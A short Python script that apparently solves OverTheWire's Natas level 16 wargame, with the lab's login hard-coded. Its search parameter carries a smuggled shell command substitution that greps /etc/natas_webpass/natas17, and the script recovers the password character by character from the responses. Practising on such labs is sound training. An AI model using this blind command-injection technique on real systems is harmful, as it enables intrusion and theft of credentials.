import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
passwd = ''

for i in range(0,34):
    for char in chars:
        data = "$(grep -E ^{}.* /etc/natas_webpass/natas17)hackers".format(passwd+char)
        url = "http://natas16.natas.labs.overthewire.org/?needle={}&submit=Search".format(data)
        r = requests.post(url, auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data = data)
        if 'hackers' not in r.text:
            passwd = passwd + char
            print(passwd)
            break
